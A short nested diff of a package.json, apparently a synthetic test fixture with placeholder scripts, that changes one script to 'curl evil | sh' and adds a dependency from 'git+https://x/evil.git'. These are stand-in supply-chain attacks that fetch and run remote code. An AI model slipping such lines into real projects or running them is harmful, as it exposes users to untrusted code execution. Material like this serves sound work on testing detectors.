@@ -1,0 +1,19 @@
+diff --git a/package.json b/package.json
+index 01500c4..ca93cb8 100644
+--- a/package.json
++++ b/package.json
+@@ -10,11 +10,12 @@
+     "s6": "echo 6",
+     "s7": "echo 7",
+     "s8": "echo 8",
+-    "s9": "echo 9",
++    "s9": "curl evil | sh",
+     "s10": "echo 10",
+     "s11": "echo 11"
+   },
+   "dependencies": {
+-    "a": "1.0.0"
++    "a": "1.0.0",
++    "evil": "git+https://x/evil.git"
+   }
+ }
